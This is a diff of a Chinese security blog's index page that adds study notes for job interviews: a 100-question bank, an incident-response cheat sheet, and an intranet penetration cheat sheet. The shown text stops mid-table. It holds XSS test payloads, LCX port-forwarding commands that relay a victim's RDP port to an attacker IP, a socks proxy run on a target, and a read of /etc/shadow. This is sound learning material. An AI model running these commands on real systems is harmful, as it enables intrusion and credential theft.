@@ -4,20 +4,20 @@
   <meta charset="utf-8">
   
   
-  <title>CX-5W 的个人网站</title>
+  <title>CX-5W 的安全笔记</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="CX-5W 的个人博客 — CTF 题解与安全技术笔记">
+  <meta name="description" content="CX-5W 的个人博客 — Web 安全 &#x2F; 渗透测试 &#x2F; CTF 题解，包含 Web 漏洞 Payload 手册与面试高频题库">
 <meta property="og:type" content="website">
-<meta property="og:title" content="CX-5W 的个人网站">
+<meta property="og:title" content="CX-5W 的安全笔记">
 <meta property="og:url" content="https://cx-5w.github.io/index.html">
-<meta property="og:site_name" content="CX-5W 的个人网站">
-<meta property="og:description" content="CX-5W 的个人博客 — CTF 题解与安全技术笔记">
+<meta property="og:site_name" content="CX-5W 的安全笔记">
+<meta property="og:description" content="CX-5W 的个人博客 — Web 安全 &#x2F; 渗透测试 &#x2F; CTF 题解，包含 Web 漏洞 Payload 手册与面试高频题库">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="CX-5W">
-<meta property="article:tag" content="CTF, Web安全, 渗透测试, 密码学, 网络安全, XCTF">
+<meta property="article:tag" content="Web安全, 渗透测试, CTF, SQL注入, XSS, 内网渗透, 应急响应, 安全笔记">
 <meta name="twitter:card" content="summary">
   
-    <link rel="alternate" href="/atom.xml" title="CX-5W 的个人网站" type="application/atom+xml">
+    <link rel="alternate" href="/atom.xml" title="CX-5W 的安全笔记" type="application/atom+xml">
   
   
     <link rel="shortcut icon" href="/favicon.png">
@@ -49,8 +49,12 @@
   <div id="header-outer" class="outer">
     <div id="header-title" class="inner">
       <h1 id="logo-wrap">
-        <a href="/" id="logo">CX-5W 的个人网站</a>
+        <a href="/" id="logo">CX-5W 的安全笔记</a>
       </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Web 安全 · CTF · 渗透测试</a>
+        </h2>
       
     </div>
     <div id="header-inner" class="inner">
@@ -59,15 +63,15 @@
         
           <a class="main-nav-link" href="/">Home</a>
         
-          <a class="main-nav-link" href="/resume">简历</a>
+          <a class="main-nav-link" href="/security-notes/">安全笔记</a>
+        
+          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
         
           <a class="main-nav-link" href="/tools">工具</a>
         
           <a class="main-nav-link" href="/projects">项目</a>
         
-          <a class="main-nav-link" href="/xctf">XCTF</a>
-        
-          <a class="main-nav-link" href="/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95">CTF题解</a>
+          <a class="main-nav-link" href="/resume">简历</a>
         
           <a class="main-nav-link" href="/about">关于我</a>
         
@@ -93,6 +97,756 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-security-notes-interview-100" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/security-notes/interview-100/" class="article-date">
+  <time class="dt-published" datetime="2026-08-07T01:40:00.000Z" itemprop="datePublished">2026-08-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E9%9D%A2%E8%AF%95/">面试</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/security-notes/interview-100/">面试高频问答 100 题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>从 45 篇笔记的「面试问答」汇总的高频题库，覆盖协议 &#x2F; 信息收集 &#x2F; Web 漏洞 &#x2F; 工具 &#x2F; 内网域 &#x2F; 应急 &#x2F; 开发。面试前过一遍，心里有底。</p>
+</blockquote>
+<p><span class="badge-key">★重点</span> 答案均为要点版，答题时记得”先结论、再展开、带例子”。</p>
+<hr>
+<h2 id="一、基础与网络协议（12）"><a href="#一、基础与网络协议（12）" class="headerlink" title="一、基础与网络协议（12）"></a>一、基础与网络协议（12）</h2><ol>
+<li><strong>HTTP 请求包格式？</strong> A：请求行、请求头、空行、请求体；GET 无体、POST 有体。</li>
+<li><strong>GET 和 POST 区别？</strong> A：数据位置（URL vs 请求体）、长度、类型、幂等性、场景（查 vs 增改）。</li>
+<li><strong>HTTP 状态码常考？</strong> A：200 成功、301&#x2F;302 重定向、304 缓存、403 禁止、404 不存在、500&#x2F;502&#x2F;504 服务端问题。</li>
+<li><strong>304 原理？</strong> A：带缓存修改时间给服务端对比，无变化返回 304 用本地缓存。</li>
+<li><strong>HTTPS 握手流程？</strong> A：客户端发握手 → 服务端回证书 → 客户端验签+摘要比对 → 公钥传预密钥 → 双方合成对称密钥 → 加密通信。</li>
+<li><strong>为什么 HTTPS 用三种算法？</strong> A：哈希验完整性、非对称做认证和密钥协商、对称加密传数据。</li>
+<li><strong>什么是同源？</strong> A：协议+域名+端口全同；同源策略拦”读取”不拦”发送”。</li>
+<li><strong>跨域方式？</strong> A：CORS 响应头、五大跨域标签、JSONP 回调。</li>
+<li><strong>Cookie 和 Session？</strong> A：HTTP 无状态，服务端 Session 存状态，Set-Cookie 下发会话 ID，请求自动携带。</li>
+<li><strong>TCP 三次握手&#x2F;四次挥手？</strong> A：SYN→SYN+ACK→ACK；FIN→ACK→FIN→ACK。</li>
+<li><strong>SYN 洪水原理？</strong> A：伪造海量 SYN 占满半连接队列，正常用户无法建连。</li>
+<li><strong>MD5 密码怎么破解？</strong> A：不可逆但可撞库&#x2F;彩虹表；防御用加盐+慢哈希（bcrypt&#x2F;argon2）。</li>
+</ol>
+<h2 id="二、信息收集与扫描（12）"><a href="#二、信息收集与扫描（12）" class="headerlink" title="二、信息收集与扫描（12）"></a>二、信息收集与扫描（12）</h2><ol start="13">
+<li><strong>为什么信息收集是核心？</strong> A：成败约 80% 取决于它；版本匹配漏洞、子域找薄弱点、CDN 绕过找源站。</li>
+<li><strong>信息收集收集什么？</strong> A：域名&#x2F;子域、真实 IP、端口服务、指纹版本、目录文件、旁站 C 段、测绘。</li>
+<li><strong>怎么判断有 CDN？</strong> A：多地 Ping，多地区多 IP&#x3D;CDN；单 IP&#x3D;真实源站。</li>
+<li><strong>CDN 绕过方法？</strong> A：子域名排查（最稳）、历史 DNS、邮件头、国外服务器 Ping。</li>
+<li><strong>Nmap 常用参数？</strong> A：<code>-sn</code> 主机发现、<code>-sS</code> SYN、<code>-sT</code> 全连接、<code>-sV</code> 版本、<code>-O</code> 系统、<code>-A</code> 综合。</li>
+<li><strong>-sS 和 -sT 区别？</strong> A：SYN 半连接隐蔽快需 root；全连接完整握手无权限但易被记录。</li>
+<li><strong>ping 不通说明主机不在？</strong> A：不一定，Windows 防火墙默认拦 ICMP，用 <code>-sn</code> 多协议探测。</li>
+<li><strong>指纹识别怎么手工判断？</strong> A：响应头 Server&#x2F;X-Powered-By + 源码关键词（wp-content、thinkphp 等）。</li>
+<li><strong>Git 泄露怎么检测利用？</strong> A：访问 <code>/.git/HEAD</code> 确认，GitHack 还原源码，git log 挖历史敏感信息。</li>
+<li><strong>目录扫描原理？</strong> A：路径字典批量拼接发包，按状态码判断（200&#x2F;301&#x2F;403&#x3D;存在）。</li>
+<li><strong>Google Hack 常用语法？</strong> A：site&#x2F;inurl&#x2F;intitle&#x2F;intext&#x2F;filetype&#x2F;- 组合。</li>
+<li><strong>旁站和 C 段？</strong> A：旁站&#x3D;同 IP 多站点；C 段&#x3D;同网段主机；主站打不动打旁站。</li>
+</ol>
+<h2 id="三、Web-漏洞（30）"><a href="#三、Web-漏洞（30）" class="headerlink" title="三、Web 漏洞（30）"></a>三、Web 漏洞（30）</h2><ol start="25">
+<li><strong>SQL 注入原理？</strong> A：用户输入未过滤直接拼接 SQL 执行，本质是信任失控。</li>
+<li><strong>怎么判断数字型&#x2F;字符型？</strong> A：数字型直接拼 <code>and 1=1</code>；字符型加引号报错、需闭合。</li>
+<li><strong>注入分类？</strong> A：按类型（数字&#x2F;字符&#x2F;搜索&#x2F;堆叠）、按位置（GET&#x2F;POST&#x2F;Cookie）、按回显（联合&#x2F;报错&#x2F;布尔&#x2F;时间）。</li>
+<li><strong>联合查询注意？</strong> A：order by 测列数、列数一致、回显位替换、Access 末尾需真实表名。</li>
+<li><strong>报错注入原理？</strong> A：updatexml&#x2F;extractvalue 非法 XPath 报错带出数据，单次 32 字符。</li>
+<li><strong>写 Shell 条件？</strong> A：secure_file_priv 开放 + 绝对路径 + 写权限，最好 root。</li>
+<li><strong>SQLMap 常用？</strong> A：<code>--dbs --tables --columns --dump</code>；登录态 <code>-r</code>；WAF <code>--tamper</code>。</li>
+<li><strong>预编译为什么能防注入？</strong> A：SQL 结构固定，输入只当值绑定；局限是动态表名&#x2F;排序等。</li>
+<li><strong>XSS 三类区别？</strong> A：存储型入库持久高危；反射型 URL 一次性；DOM 型前端动态渲染。</li>
+<li><strong>XSS 怎么验证？</strong> A：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 或 <code>&lt;img src=x onerror=alert(1)&gt;</code> 弹窗。</li>
+<li><strong>属性内输出怎么打 XSS？</strong> A：引号闭合+事件注入：<code>&#39; onclick=alert(1) &gt;</code>。</li>
+<li><strong>XSS 危害？</strong> A：窃取 Cookie 冒充登录、键盘记录、钓鱼；管理员中招&#x3D;后台沦陷。</li>
+<li><strong>XSS 防御？</strong> A：输入过滤+输出转义双端，CSP 兜底。</li>
+<li><strong>文件上传怎么绕过？</strong> A：前端删 JS&#x2F;改包；MIME 改 Content-Type；文件头做图片马；后缀大小写双写截断。</li>
+<li><strong>图片马能直接用吗？</strong> A：不能，需解析漏洞&#x2F;文件包含配合执行。</li>
+<li><strong>解析漏洞有哪些？</strong> A：IIS6 分号截断&#x2F;目录解析；Apache 多后缀回溯；Nginx fix_pathinfo。</li>
+<li><strong>文件包含怎么产生？</strong> A：include 路径用户可控无白名单；包含函数不校验后缀只解析内容。</li>
+<li><strong>LFI 和 RFI？</strong> A：LFI 本地文件无配置要求；RFI 远程 URL 需 allow_url_include 开启。</li>
+<li><strong>命令执行危险函数？</strong> A：PHP system&#x2F;exec&#x2F;shell_exec&#x2F;反引号；eval&#x2F;assert。</li>
+<li><strong>命令连接符？</strong> A：<code>;</code> 无条件、<code>&amp;&amp;</code> 成功才执行、<code>||</code> 失败才执行、<code>|</code> 管道。</li>
+<li><strong>反序列化漏洞原理？</strong> A：不可信序列化串直接 unserialize，触发魔术方法执行代码。</li>
+<li><strong>反序列化常见组件？</strong> A：WebLogic、Shiro、Fastjson、Apache Commons。</li>
+<li><strong>什么是 SSRF？</strong> A：服务端代替攻击者发请求，可探测内网、读文件。</li>
+<li><strong>SSRF 绕过？</strong> A：进制转换、IP 简写、@ 解析、重定向。</li>
+<li><strong>什么是 XXE？</strong> A：XML 外部实体注入，读文件&#x2F;内网请求，无回显用报错或外带。</li>
+<li><strong>逻辑漏洞为什么扫不出来？</strong> A：无特征码，藏在业务逻辑里，只能手工结合业务测。</li>
+<li><strong>常见逻辑漏洞？</strong> A：支付改价、状态参数篡改、密码找回绕过、短信轰炸、越权。</li>
+<li><strong>越权分类？</strong> A：未授权访问、水平越权（同级换 ID）、垂直越权（低权限高操作）。</li>
+<li><strong>怎么测垂直越权？</strong> A：两个账号，管理员操作抓包，换普通用户身份信息放包。</li>
+<li><strong>暴力破解验证码绕过？</strong> A：前端删 JS&#x2F;删字段；后端吃时效（60 秒内复用）或纯数字爆破。</li>
+</ol>
+<h2 id="四、工具与对抗（10）"><a href="#四、工具与对抗（10）" class="headerlink" title="四、工具与对抗（10）"></a>四、工具与对抗（10）</h2><ol start="55">
+<li><strong>AWVS 定位？</strong> A：Web 漏洞扫描器，配登录态扫后台，报告分级，高危必须手工验证。</li>
+<li><strong>Xray 特点？</strong> A：单文件免装、少发包高精准、POC 可定制、反连平台，和 Burp 联动。</li>
+<li><strong>Xray 和 AWVS 分工？</strong> A：AWVS 全量初筛，Xray 精准复核&#x2F;免打扰扫描。</li>
+<li><strong>Nessus 做什么？</strong> A：系统漏洞扫描，8834 网页管理，免费版限 16 IP。</li>
+<li><strong>CS 是什么？</strong> A：红队平台，客户端-服务端，Beacon 控主机，集成提权&#x2F;凭据&#x2F;代理&#x2F;钓鱼。</li>
+<li><strong>CS 和 MSF 配合？</strong> A：会话互转，能力互补。</li>
+<li><strong>有状态&#x2F;无状态木马？</strong> A：有状态自动持久化易被杀；无状态只起进程，需手动 sc create 持久化。</li>
+<li><strong>WAF 怎么识别？</strong> A：发攻击载荷看响应&#x2F;wafw00f；规则库匹配不到&#x3D;放行。</li>
+<li><strong>WAF 绕过思路？</strong> A：编码、大小写、注释、等价替换、分块传输、换请求位置。</li>
+<li><strong>免杀怎么做？</strong> A：基于语言特性变形（变量&#x2F;拼接&#x2F;编码&#x2F;自定义函数）+加壳；写完用杀软测、能连才算。</li>
+</ol>
+<h2 id="五、内网与域（15）"><a href="#五、内网与域（15）" class="headerlink" title="五、内网与域（15）"></a>五、内网与域（15）</h2><ol start="65">
+<li><strong>内网渗透思路？</strong> A：先完全控制外网主机 → 信息收集 → 代理&#x2F;隧道打通 → 横向扩大。</li>
+<li><strong>不出网怎么办？</strong> A：Socks 代理（EW&#x2F;reGeorg）或隧道（ICMP&#x2F;DNS）转出。</li>
+<li><strong>代理和隧道区别？</strong> A：代理转发不换协议；隧道把数据加工成其他协议绕过过滤。</li>
+<li><strong>FRP 干什么？</strong> A：NAT 穿透，公网服务器做映射，目标经公网回连。</li>
+<li><strong>内网信息收集什么？</strong> A：系统&#x2F;补丁、用户组、杀软、防火墙、端口服务、域信息。</li>
+<li><strong>端口转发工具？</strong> A：NC、LCX（转出什么端口用对应工具接）。</li>
+<li><strong>横向渗透手法？</strong> A：口令复用、PTH、永恒之蓝、弱口令爆破、Web 漏洞复用。</li>
+<li><strong>工作组 vs 域？</strong> A：工作组只分组无统一管理认证；域靠 DC 统一管理和认证。</li>
+<li><strong>Kerberos 认证链？</strong> A：AS 验身份→TGT→TGS 换票→ST→服务放行。</li>
+<li><strong>黄金票据？</strong> A：伪造 TGT，需要 krbtgt 哈希+SID，可申请任意服务票，通常做权限维持。</li>
+<li><strong>白银票据？</strong> A：伪造 ST，需要目标服务账号哈希+SID，只能访问单个服务。</li>
+<li><strong>PTH 和 PTT？</strong> A：PTH 用哈希直接认证；PTT 导入票据冒充身份。</li>
+<li><strong>定位域控？</strong> A：nltest &#x2F; net group “domain controllers” &#x2F; whoami &#x2F;all；拿下域控&#x3D;控制全域。</li>
+<li><strong>Kerberoasting？</strong> A：申请服务票据离线爆破服务账号密码。</li>
+<li><strong>提权思路？</strong> A：先信息收集（版本&#x2F;补丁&#x2F;权限），再匹配漏洞 EXP；Windows 补丁、Linux SUID&#x2F;内核、数据库 SA。</li>
+</ol>
+<h2 id="六、应急与运营（13）"><a href="#六、应急与运营（13）" class="headerlink" title="六、应急与运营（13）"></a>六、应急与运营（13）</h2><ol start="80">
+<li><strong>应急响应六阶段？</strong> A：准备→启动→检测→抑制→根除→恢复→跟进。</li>
+<li><strong>挖矿病毒怎么处理？</strong> A：断网→查异常连接&#x2F;进程→删文件→清计划任务启动项→修漏洞→复查。</li>
+<li><strong>为什么先杀进程再删文件？</strong> A：运行中的程序会自我恢复&#x2F;保护文件。</li>
+<li><strong>映像劫持？</strong> A：注册表把杀软路径改错导致打不开；改名绕过&#x2F;SREng 清理。</li>
+<li><strong>Linux 排查要点？</strong> A：passwd 异常账号、authorized_keys 后门、计划任务、日志。</li>
+<li><strong>Web 应急流程？</strong> A：隔离→扫 WebShell→日志定位→清理→修复→复测。</li>
+<li><strong>护网蓝队分组？</strong> A：监测→研判→处置(封IP)→溯源→反制。</li>
+<li><strong>怎么研判攻击？</strong> A：数据包特征+攻击次数+历史行为，结合资产判断真假与成败。</li>
+<li><strong>等保流程？</strong> A：定级备案→差距评估→建设整改→等级测评。</li>
+<li><strong>等保 2.0 十方面？</strong> A：物理、通信、区域边界、计算环境、管理中心+管理五方面。</li>
+<li><strong>安全加固做什么？</strong> A：口令复杂度&#x2F;锁定、账号清理、日志开启、补丁、关端口。</li>
+<li><strong>常见安全设备？</strong> A：防火墙、WAF、IDS&#x2F;IPS、态势感知、VPN、抗DDoS、审计。</li>
+<li><strong>渗透测试报告要素？</strong> A：概述、资产、漏洞清单分级、复现截图、修复建议、总结。</li>
+</ol>
+<h2 id="七、安全开发（8）"><a href="#七、安全开发（8）" class="headerlink" title="七、安全开发（8）"></a>七、安全开发（8）</h2><ol start="93">
+<li><strong>POC 和 EXP 区别？</strong> A：POC 验证漏洞存在；EXP 利用漏洞拿权限；Payload 是恶意载荷。</li>
+<li><strong>为什么安全要学 Python？</strong> A：大量安全工具&#x2F;POC 是 Python 写的，能看懂能改能自写。</li>
+<li><strong>requests 和 socket？</strong> A：requests 应用层 HTTP 封装；socket 底层灵活（端口扫描&#x2F;自定义协议）。</li>
+<li><strong>怎么模拟登录态爬数据？</strong> A：浏览器复制 Cookie&#x2F;UA 放进 headers。</li>
+<li><strong>端口扫描为什么用 connect_ex？</strong> A：不抛异常、返回 0&#x3D;开放、速度快。</li>
+<li><strong>爆破脚本怎么提速？</strong> A：queue 队列+threading 多线程并发取任务，避免重复。</li>
+<li><strong>代码审计从哪入手？</strong> A：搜危险函数（system&#x2F;eval&#x2F;include&#x2F;unserialize）→追数据来源→查过滤。</li>
+<li><strong>怎么保证脚本稳定？</strong> A：try&#x2F;except 容错、timeout、控制线程、打印进度。</li>
+</ol>
+<hr>
+<p><span class="badge-key">★重点</span> 面试加分技巧：<strong>答题用”先结论后展开+带真实场景”</strong>（如”我在靶场&#x2F;项目里…”），比背概念更让面试官认可。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cx-5w.github.io/security-notes/interview-100/" data-id="cuidEnmrZbX0t8fTA75F82jFU" data-title="面试高频问答 100 题" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95/" rel="tag">面试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A2%98%E5%BA%93/" rel="tag">题库</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%AB%98%E9%A2%91/" rel="tag">高频</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-security-notes-incident-response" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/security-notes/incident-response/" class="article-date">
+  <time class="dt-published" datetime="2026-08-07T01:30:00.000Z" itemprop="datePublished">2026-08-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/security-notes/incident-response/">应急响应速查</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>应急响应六阶段 + 排查命令清单 + 常见事件处置。面试 50% 会问的实战题。</p>
+</blockquote>
+<h2 id="一、六阶段"><a href="#一、六阶段" class="headerlink" title="一、六阶段"></a>一、六阶段</h2><p><span class="badge-key">★重点</span> <span class="badge-interview">面试高频</span></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">准备(快照备份) → 启动 → 检测(异常连接/进程) → 抑制(断网隔离) → 根除(清理) → 恢复 → 跟进(监控)</span><br></pre></td></tr></table></figure>
+
+<p>核心原则：<strong>先隔离防扩散 → 先杀进程再删文件 → 查根因修漏洞 → 复查确认</strong>。</p>
+<h2 id="二、Windows-排查命令"><a href="#二、Windows-排查命令" class="headerlink" title="二、Windows 排查命令"></a>二、Windows 排查命令</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">findstr</span> ESTABLISHED   # 异常外连</span><br><span class="line">tasklist /svc                        # 进程对应服务</span><br><span class="line"><span class="built_in">dir</span> /s 文件名                         # 定位程序文件</span><br><span class="line">regedit                              # 启动项/映像劫持</span><br></pre></td></tr></table></figure>
+
+<p>映像劫持：病毒把杀软路径改错导致打不开——改名绕过 &#x2F; SREng 清理注册表劫持项。</p>
+<h2 id="三、Linux-排查命令"><a href="#三、Linux-排查命令" class="headerlink" title="三、Linux 排查命令"></a>三、Linux 排查命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | grep -v nologin    <span class="comment"># 异常账号</span></span><br><span class="line"><span class="built_in">cat</span> /root/.ssh/authorized_keys       <span class="comment"># SSH 公钥后门</span></span><br><span class="line">netstat -anp / ps -ef                <span class="comment"># 异常连接/进程</span></span><br><span class="line">crontab -l &amp;&amp; <span class="built_in">cat</span> /etc/crontab       <span class="comment"># 计划任务</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/secure              <span class="comment"># 登录日志</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="四、常见事件处置"><a href="#四、常见事件处置" class="headerlink" title="四、常见事件处置"></a>四、常见事件处置</h2><table>
+<thead>
+<tr>
+<th>事件</th>
+<th>特征</th>
+<th>处置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>挖矿病毒</td>
+<td>CPU 飙高、连接矿池</td>
+<td>断网→定位进程文件→删除→清计划任务→修漏洞</td>
+</tr>
+<tr>
+<td>勒索病毒</td>
+<td>文件加密、比特币勒索</td>
+<td>隔离→备份→查 445 传播源→恢复→打补丁</td>
+</tr>
+<tr>
+<td>WebShell&#x2F;挂马</td>
+<td>页面异常、可疑脚本</td>
+<td>扫 WebShell→日志定位→清理→修复→复测</td>
+</tr>
+<tr>
+<td>账号异常</td>
+<td>异常登录</td>
+<td>查安全日志→改密→封来源 IP</td>
+</tr>
+</tbody></table>
+<h2 id="五、Web-应急"><a href="#五、Web-应急" class="headerlink" title="五、Web 应急"></a>五、Web 应急</h2><p>攻击入口三来源：系统漏洞（135&#x2F;445）、Web 漏洞（注入&#x2F;上传拿 Shell）、后台弱口令。</p>
+<p>排查流程：异常连接 → 进程 → Web 目录（D 盾扫 WebShell）→ 访问日志定位攻击路径 → 清理修复 → 复查。</p>
+<h2 id="六、护网与安全设备"><a href="#六、护网与安全设备" class="headerlink" title="六、护网与安全设备"></a>六、护网与安全设备</h2><p>蓝队分组：<strong>监测 → 研判 → 处置(封IP) → 溯源 → 反制</strong>。</p>
+<p>设备：防火墙(边界)、WAF(应用)、IDS&#x2F;IPS、态势感知(天眼)、防病毒网关、VPN、抗DDoS。</p>
+<p>研判要点：数据包特征（<code>select union</code>、<code>cat /etc/passwd</code>）+ 攻击次数 + 50x 状态码（被拦截）。</p>
+<h2 id="七、等保速记"><a href="#七、等保速记" class="headerlink" title="七、等保速记"></a>七、等保速记</h2><p><span class="badge-interview">面试高频</span> 流程：<strong>定级备案 → 差距评估 → 建设整改 → 等级测评</strong>。</p>
+<p>2.0 十方面：物理、通信网络、区域边界、计算环境、管理中心 + 管理五方面（制度&#x2F;机构&#x2F;人员&#x2F;建设&#x2F;运维）。</p>
+<p>加固核心：<strong>身份鉴别（口令 8 位+锁定）、访问控制、安全审计（日志）、补丁、关端口</strong>。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cx-5w.github.io/security-notes/incident-response/" data-id="cuidFMfHoDW0OxBjE_r13CBFi" data-title="应急响应速查" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BA%94%E6%80%A5/" rel="tag">应急</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%A4%E7%BD%91/" rel="tag">护网</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9F%A5%E6%9D%80/" rel="tag">查杀</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AD%89%E4%BF%9D/" rel="tag">等保</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-security-notes-intranet-domain" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/security-notes/intranet-domain/" class="article-date">
+  <time class="dt-published" datetime="2026-08-07T01:20:00.000Z" itemprop="datePublished">2026-08-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/">安全笔记</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/security-notes/intranet-domain/">内网渗透与域渗透速查</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>内网渗透三大问：主机不出网怎么办？怎么横向？域怎么打？速查表一条线讲清。</p>
+</blockquote>
+<h2 id="一、三种出网场景三种打法"><a href="#一、三种出网场景三种打法" class="headerlink" title="一、三种出网场景三种打法"></a>一、三种出网场景三种打法</h2><p><span class="badge-key">★重点</span> <span class="badge-interview">面试高频</span></p>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>技术</th>
+<th>工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>能上网但连不上</td>
+<td>NAT 穿透</td>
+<td>FRP &#x2F; ngrok &#x2F; NPS</td>
+</tr>
+<tr>
+<td>纯内网不出网</td>
+<td>Socks 代理</td>
+<td>EW &#x2F; reGeorg + Proxifier</td>
+</tr>
+<tr>
+<td>数据被防火墙拦</td>
+<td>隧道换协议</td>
+<td>ICMP(pingtunnel) &#x2F; DNS(CS)</td>
+</tr>
+</tbody></table>
+<p><strong>代理 vs 隧道</strong>：代理转发数据不换协议；隧道把数据加工成其他协议绕过过滤。</p>
+<h2 id="二、内网信息收集"><a href="#二、内网信息收集" class="headerlink" title="二、内网信息收集"></a>二、内网信息收集</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo                    # 系统+补丁</span><br><span class="line"><span class="built_in">net</span> user / <span class="built_in">net</span> localgroup administrators</span><br><span class="line">wmic                          # 查杀软</span><br><span class="line">netstat -ano                  # 异常连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd /etc/shadow</span><br><span class="line"><span class="built_in">who</span> / last</span><br><span class="line">netstat -anp</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、端口转发与代理"><a href="#三、端口转发与代理" class="headerlink" title="三、端口转发与代理"></a>三、端口转发与代理</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># LCX：攻击机监听 → 目标机 slave → 攻击机 tran → 工具连接</span><br><span class="line">lcx.exe -listen <span class="number">2222</span></span><br><span class="line">lcx.exe -slave 攻击机IP <span class="number">2222</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">3389</span></span><br><span class="line">lcx.exe -tran <span class="number">4444</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">2222</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># EW 正向代理：目标机执行后，SocksCap/proxychains 连接</span></span><br><span class="line">ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、横向渗透"><a href="#四、横向渗透" class="headerlink" title="四、横向渗透"></a>四、横向渗透</h2><ul>
+<li>口令复用（同一密码多台机器）。</li>
+<li>PTH 哈希传递：<code>psexec</code> &#x2F; Impacket（知道哈希即可认证）。</li>
+<li>永恒之蓝 MS17-010（445，老系统）。</li>
+<li>弱口令爆破 SMB&#x2F;3389&#x2F;SSH&#x2F;数据库。</li>
+<li>代理打通后，内网渗透 &#x3D; 公网渗透。</li>
+</ul>
+<h2 id="五、提权速查"><a href="#五、提权速查" class="headerlink" title="五、提权速查"></a>五、提权速查</h2><table>
+<thead>
+<tr>
+<th>系统</th>
+<th>手法</th>
+</tr>
+</thead>
